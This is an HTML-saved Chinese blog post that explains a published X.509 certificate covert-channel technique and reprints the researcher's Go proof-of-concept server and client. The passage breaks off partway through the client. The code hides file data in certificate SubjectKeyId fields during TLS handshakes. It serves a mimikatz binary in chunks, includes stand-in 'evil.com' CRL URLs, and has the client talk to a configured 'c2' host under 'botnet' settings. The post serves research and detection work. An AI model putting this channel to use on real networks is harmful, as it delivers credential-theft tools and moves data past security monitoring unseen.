<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="使用X.509公钥证书传递进行隐匿传输数据看到国外一篇有关于在ssl认证过程中，通过证书传递达到一个隐匿传输数据的过程 隐蔽通道 使用隐蔽通道在网络上传输数据并不新鲜。在过去的二十年，各种刊物上都有这样的参考文献[1]。例如，向ICMP追加数据被认为是2005年采用的数据传输方式[2]，其引用了1997年的文献。实际上，最早提出采纳实用的隐蔽通道出自1993年的政府刊物[3]。研究人员不断的寻找滥">
<meta property="og:type" content="article">
<meta property="og:title" content="使用X.509公钥证书传递进行隐匿传输数据">
<meta property="og:url" content="http://blog.leej.me/2018/02/11/使用X-509公钥证书传递进行隐匿传输数据/index.html">
<meta property="og:site_name" content="Leej">
<meta property="og:description" content="使用X.509公钥证书传递进行隐匿传输数据看到国外一篇有关于在ssl认证过程中，通过证书传递达到一个隐匿传输数据的过程 隐蔽通道 使用隐蔽通道在网络上传输数据并不新鲜。在过去的二十年，各种刊物上都有这样的参考文献[1]。例如，向ICMP追加数据被认为是2005年采用的数据传输方式[2]，其引用了1997年的文献。实际上，最早提出采纳实用的隐蔽通道出自1993年的政府刊物[3]。研究人员不断的寻找滥">
<meta property="og:locale" content="en">
<meta property="og:image" content="https://www.cem.me/art/cryptoposters/x509.png">
<meta property="og:updated_time" content="2018-02-11T09:48:53.306Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="使用X.509公钥证书传递进行隐匿传输数据">
<meta name="twitter:description" content="使用X.509公钥证书传递进行隐匿传输数据看到国外一篇有关于在ssl认证过程中，通过证书传递达到一个隐匿传输数据的过程 隐蔽通道 使用隐蔽通道在网络上传输数据并不新鲜。在过去的二十年，各种刊物上都有这样的参考文献[1]。例如，向ICMP追加数据被认为是2005年采用的数据传输方式[2]，其引用了1997年的文献。实际上，最早提出采纳实用的隐蔽通道出自1993年的政府刊物[3]。研究人员不断的寻找滥">
<meta name="twitter:image" content="https://www.cem.me/art/cryptoposters/x509.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>使用X.509公钥证书传递进行隐匿传输数据</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- rss -->
    
    
</head>

<body>
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://github.com/leejgod">Projects</a></li>
         
          <li><a href="/Search/">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2018/02/11/导出Chrome浏览器中保存的密码/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2018/02/07/关于自动化审计工具的一些设想/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://blog.leej.me/2018/02/11/使用X-509公钥证书传递进行隐匿传输数据/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://blog.leej.me/2018/02/11/使用X-509公钥证书传递进行隐匿传输数据/&text=使用X.509公钥证书传递进行隐匿传输数据"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://blog.leej.me/2018/02/11/使用X-509公钥证书传递进行隐匿传输数据/&title=使用X.509公钥证书传递进行隐匿传输数据"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.leej.me/2018/02/11/使用X-509公钥证书传递进行隐匿传输数据/&is_video=false&description=使用X.509公钥证书传递进行隐匿传输数据"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=使用X.509公钥证书传递进行隐匿传输数据&body=Check out this article: http://blog.leej.me/2018/02/11/使用X-509公钥证书传递进行隐匿传输数据/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://blog.leej.me/2018/02/11/使用X-509公钥证书传递进行隐匿传输数据/&title=使用X.509公钥证书传递进行隐匿传输数据"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://blog.leej.me/2018/02/11/使用X-509公钥证书传递进行隐匿传输数据/&title=使用X.509公钥证书传递进行隐匿传输数据"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://blog.leej.me/2018/02/11/使用X-509公钥证书传递进行隐匿传输数据/&title=使用X.509公钥证书传递进行隐匿传输数据"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://blog.leej.me/2018/02/11/使用X-509公钥证书传递进行隐匿传输数据/&title=使用X.509公钥证书传递进行隐匿传输数据"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://blog.leej.me/2018/02/11/使用X-509公钥证书传递进行隐匿传输数据/&name=使用X.509公钥证书传递进行隐匿传输数据&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用X-509公钥证书传递进行隐匿传输数据"><span class="toc-number">1.</span> <span class="toc-text">使用X.509公钥证书传递进行隐匿传输数据</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index width mx-auto px2 my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        使用X.509公钥证书传递进行隐匿传输数据
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Leej</span>
      </span>
      
    <div class="postdate">
        <time datetime="2018-02-11T09:47:50.000Z" itemprop="datePublished">2018-02-11</time>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h3 id="使用X-509公钥证书传递进行隐匿传输数据"><a href="#使用X-509公钥证书传递进行隐匿传输数据" class="headerlink" title="使用X.509公钥证书传递进行隐匿传输数据"></a>使用X.509公钥证书传递进行隐匿传输数据</h3><p>看到国外一篇有关于在ssl认证过程中，通过证书传递达到一个隐匿传输数据的过程</p>
<p><strong>隐蔽通道</strong></p>
<p>使用隐蔽通道在网络上传输数据并不新鲜。在过去的二十年，各种刊物上都有这样的参考文献<a href="https://www.icann.org/news/blog/what-is-a-dns-covert-channel" target="_blank" rel="noopener">[1]</a>。例如，向ICMP追加数据被认为是2005年采用的数据传输方式<a href="https://www.giac.org/paper/gcih/664/ping-covertchannel/104890" target="_blank" rel="noopener">[2]</a>，其引用了1997年的文献。实际上，最早提出采纳实用的隐蔽通道出自1993年的政府刊物[3]。研究人员不断的寻找滥用协议及RFC的新颖方法，以实现难以检测的数据传输方法。</p>
<p>2018年1月，Fidelis的研究人员Jason Reaves发表了使用X.509扩展来实现隐藏通道的研究<a href="https://en.wikipedia.org/wiki/Covert_channel" target="_blank" rel="noopener">[7]</a>，扩充了此前的研究[6]。可在已发表的研究[5][17]中阅读相关方法。</p>
<p>Jason在论文中描述了一个系统，可用来发送或接收来自客户端和服务器的数据。通过对X.509证书的研究，特别是可将任意二进制数据嵌入证书，或许可将其用作隐蔽通道。研究表明，动力十足的攻击者可利用此技术实现超出预定目标的攻击，最终可绕过常见的安全措施。</p>
<p>简而言之，TLS X.509证书有很多可以存储字符串的字段，可参见这张图片[16]。</p>
<p><img src="https://www.cem.me/art/cryptoposters/x509.png" alt=""></p>
<p>这些字段包括版本、序列号、颁发者名称、有效期等。在研究中描述的证书滥用，就是将传输的数据隐藏在这些字段中的一个。由于证书交换在TLS会话建立之前，因此好像没有进行数据传输，而实际上数据在证书交换过程中传输。</p>
<p>给出作者的一个POC</p>
<p>server.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Server code for demonstrating transfering a file over x509 extension covert channel.</span></span><br><span class="line"><span class="comment">Research paper over x509 covert channel: http://vixra.org/abs/1801.0016</span></span><br><span class="line"><span class="comment">Written by: Jason Reaves</span></span><br><span class="line"><span class="comment">ver1 - 2Jan2018</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">MIT License</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Copyright (c) 2018 Jason Reaves</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Permission is hereby granted, free of charge, to any person obtaining a copy</span></span><br><span class="line"><span class="comment">of this software and associated documentation files (the "Software"), to deal</span></span><br><span class="line"><span class="comment">in the Software without restriction, including without limitation the rights</span></span><br><span class="line"><span class="comment">to use, copy, modify, merge, publish, distribute, sublicense, and/or sell</span></span><br><span class="line"><span class="comment">copies of the Software, and to permit persons to whom the Software is</span></span><br><span class="line"><span class="comment">furnished to do so, subject to the following conditions:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The above copyright notice and this permission notice shall be included in all</span></span><br><span class="line"><span class="comment">copies or substantial portions of the Software.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR</span></span><br><span class="line"><span class="comment">IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,</span></span><br><span class="line"><span class="comment">FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE</span></span><br><span class="line"><span class="comment">AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER</span></span><br><span class="line"><span class="comment">LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,</span></span><br><span class="line"><span class="comment">OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE</span></span><br><span class="line"><span class="comment">SOFTWARE.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"crypto/rand"</span></span><br><span class="line">	<span class="string">"crypto/rsa"</span></span><br><span class="line">	<span class="string">"crypto/tls"</span></span><br><span class="line">	<span class="string">"crypto/x509"</span></span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"io/ioutil"</span></span><br><span class="line">	<span class="string">"log"</span></span><br><span class="line">	<span class="string">"malcert_mimikatz_poc/helper"</span></span><br><span class="line">	<span class="string">"net"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> active_client <span class="keyword">struct</span> &#123;</span><br><span class="line">	ip    <span class="keyword">string</span></span><br><span class="line">	index <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> currclient active_client</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">verifyHook</span><span class="params">(rawCerts [][]<span class="keyword">byte</span>, verifiedChains [][]*x509.Certificate)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	cert, _ := x509.ParseCertificate(rawCerts[<span class="number">0</span>])</span><br><span class="line">	data := cert.SubjectKeyId</span><br><span class="line">	dec := helper.DecryptData(data)</span><br><span class="line">	fmt.Println(<span class="string">"Received from client: "</span>, dec)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bsize = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	priv, _ := rsa.GenerateKey(rand.Reader, <span class="number">4096</span>)</span><br><span class="line">	ca, pv := helper.GenCert(<span class="string">"EICAR"</span>, []<span class="keyword">byte</span>&#123;&#125;, []<span class="keyword">string</span>&#123;<span class="string">"http://evil.com/ca1.crl"</span>, <span class="string">"http://evil2.com/ca2.crl"</span>&#125;, priv)</span><br><span class="line"></span><br><span class="line">	fdata, _ := ioutil.ReadFile(<span class="string">"mimikatz.bin"</span>)</span><br><span class="line">	sz := <span class="built_in">len</span>(fdata)</span><br><span class="line">	iterations := sz / bsize</span><br><span class="line">	fmt.Println(<span class="string">"Iterations until done: "</span>, iterations)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		cert, err := tls.X509KeyPair(ca, pv)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Fatalf(<span class="string">"server: loadkeys: %s"</span>, err)</span><br><span class="line">		&#125;</span><br><span class="line">		config := tls.Config&#123;Certificates: []tls.Certificate&#123;cert&#125;&#125;</span><br><span class="line">		config.InsecureSkipVerify = <span class="literal">true</span></span><br><span class="line">		config.VerifyPeerCertificate = verifyHook</span><br><span class="line">		config.ClientAuth = tls.RequireAnyClientCert</span><br><span class="line">		config.Rand = rand.Reader</span><br><span class="line">		service := <span class="string">"0.0.0.0:4433"</span></span><br><span class="line">		listener, err := tls.Listen(<span class="string">"tcp"</span>, service, &amp;config)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Fatalf(<span class="string">"server: listen: %s"</span>, err)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//log.Print("server: listening")</span></span><br><span class="line">		conn, err := listener.Accept()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Printf(<span class="string">"server: accept: %s"</span>, err)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">defer</span> conn.Close()</span><br><span class="line">		<span class="keyword">if</span> currclient.ip == <span class="string">""</span> &#123;</span><br><span class="line">			currclient.ip = conn.RemoteAddr().String()</span><br><span class="line">			currclient.index = <span class="number">0</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			blob := []<span class="keyword">byte</span>(<span class="string">"DONE"</span>)</span><br><span class="line">			<span class="keyword">if</span> currclient.index &lt; iterations &#123;</span><br><span class="line">				blob = fdata[currclient.index*bsize : (currclient.index+<span class="number">1</span>)*bsize]</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> currclient.index == iterations &#123;</span><br><span class="line">				blob = fdata[currclient.index*bsize : sz]</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				currclient.index = <span class="number">0</span></span><br><span class="line">				currclient.ip = <span class="string">""</span></span><br><span class="line">			&#125;</span><br><span class="line">			currclient.index += <span class="number">1</span></span><br><span class="line">			ca, pv = helper.GenCertWithFile(<span class="string">"EICAR"</span>, blob, priv)</span><br><span class="line">		&#125;</span><br><span class="line">		log.Printf(<span class="string">"server: accepted from %s"</span>, conn.RemoteAddr())</span><br><span class="line">		tlscon, ok := conn.(*tls.Conn)</span><br><span class="line">		<span class="keyword">if</span> ok &#123;</span><br><span class="line">			log.Print(<span class="string">"ok=true"</span>)</span><br><span class="line">			state := tlscon.ConnectionState()</span><br><span class="line">			log.Print(state.PeerCertificates)</span><br><span class="line">			<span class="keyword">for</span> _, v := <span class="keyword">range</span> state.PeerCertificates &#123;</span><br><span class="line">				log.Print(x509.MarshalPKIXPublicKey(v.PublicKey))</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">go</span> handleClient(conn)</span><br><span class="line">		listener.Close()</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleClient</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line">	<span class="keyword">defer</span> conn.Close()</span><br><span class="line">	buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">512</span>)</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		log.Print(<span class="string">"server: conn: waiting"</span>)</span><br><span class="line">		n, err := conn.Read(buf)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				log.Printf(<span class="string">"server: conn: read: %s"</span>, err)</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		log.Printf(<span class="string">"server: conn: echo %q\n"</span>, <span class="keyword">string</span>(buf[:n]))</span><br><span class="line">		n, err = conn.Write(buf[:n])</span><br><span class="line"></span><br><span class="line">		n, err = conn.Write(buf[:n])</span><br><span class="line">		log.Printf(<span class="string">"server: conn: wrote %d bytes"</span>, n)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Printf(<span class="string">"server: write: %s"</span>, err)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	log.Println(<span class="string">"server: conn: closed"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>client.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Client code for demonstrating transfering a file over x509 extension covert channel.</span></span><br><span class="line"><span class="comment">Research paper over x509 covert channel: http://vixra.org/abs/1801.0016</span></span><br><span class="line"><span class="comment">Written by: Jason Reaves</span></span><br><span class="line"><span class="comment">ver1 - 2Jan2018</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">MIT License</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Copyright (c) 2018 Jason Reaves</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Permission is hereby granted, free of charge, to any person obtaining a copy</span></span><br><span class="line"><span class="comment">of this software and associated documentation files (the "Software"), to deal</span></span><br><span class="line"><span class="comment">in the Software without restriction, including without limitation the rights</span></span><br><span class="line"><span class="comment">to use, copy, modify, merge, publish, distribute, sublicense, and/or sell</span></span><br><span class="line"><span class="comment">copies of the Software, and to permit persons to whom the Software is</span></span><br><span class="line"><span class="comment">furnished to do so, subject to the following conditions:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The above copyright notice and this permission notice shall be included in all</span></span><br><span class="line"><span class="comment">copies or substantial portions of the Software.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR</span></span><br><span class="line"><span class="comment">IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,</span></span><br><span class="line"><span class="comment">FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE</span></span><br><span class="line"><span class="comment">AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER</span></span><br><span class="line"><span class="comment">LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,</span></span><br><span class="line"><span class="comment">OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE</span></span><br><span class="line"><span class="comment">SOFTWARE.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"crypto/md5"</span></span><br><span class="line">	<span class="string">"crypto/rand"</span></span><br><span class="line">	<span class="string">"crypto/rsa"</span></span><br><span class="line">	<span class="string">"crypto/tls"</span></span><br><span class="line">	<span class="comment">//"crypto/x509"</span></span><br><span class="line">	<span class="string">"bytes"</span></span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"log"</span></span><br><span class="line">	<span class="string">"malcert_mimikatz_poc/helper"</span></span><br><span class="line">	<span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> settings <span class="keyword">struct</span> &#123;</span><br><span class="line">	c2     <span class="keyword">string</span></span><br><span class="line">	port   <span class="keyword">string</span></span><br><span class="line">	botnet <span class="keyword">string</span></span><br><span class="line">	priv   *rsa.PrivateKey</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SendData</span><span class="params">(settings settings, data <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	<span class="comment">//We can load cert data from files as well</span></span><br><span class="line">	<span class="comment">//cert, err := tls.LoadX509KeyPair("certs/client.pem", "certs/client.key")</span></span><br><span class="line">	ca, pv := helper.GenCertWithString(settings.botnet, data, settings.priv)</span><br><span class="line">	c2 := settings.c2 + <span class="string">":"</span> + settings.port</span><br><span class="line">	cert, err := tls.X509KeyPair(ca, pv)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">"server: loadkeys: %s"</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	config := tls.Config&#123;Certificates: []tls.Certificate&#123;cert&#125;, InsecureSkipVerify: <span class="literal">true</span>&#125;</span><br><span class="line">	fdata := []<span class="keyword">byte</span>&#123;&#125;</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		conn, err := tls.Dial(<span class="string">"tcp"</span>, c2, &amp;config)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Fatalf(<span class="string">"client: dial: %s"</span>, err)</span><br><span class="line">		&#125;</span><br><span class="line">		log.Println(<span class="string">"client: connected to: "</span>, conn.RemoteAddr())</span><br><span class="line"></span><br><span class="line">		state := conn.ConnectionState()</span><br><span class="line">		rdata := []<span class="keyword">byte</span>&#123;&#125;</span><br><span class="line">		<span class="keyword">for</span> _, v := <span class="keyword">range</span> state.PeerCertificates &#123;</span><br><span class="line">			rdata = v.SubjectKeyId</span><br><span class="line">			<span class="keyword">if</span> bytes.Compare(rdata, []<span class="keyword">byte</span>(<span class="string">"DONE"</span>)) == <span class="number">0</span> &#123;</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			&#125;</span><br><span class="line">			fdata = <span class="built_in">append</span>(fdata, v.SubjectKeyId...)</span><br><span class="line">			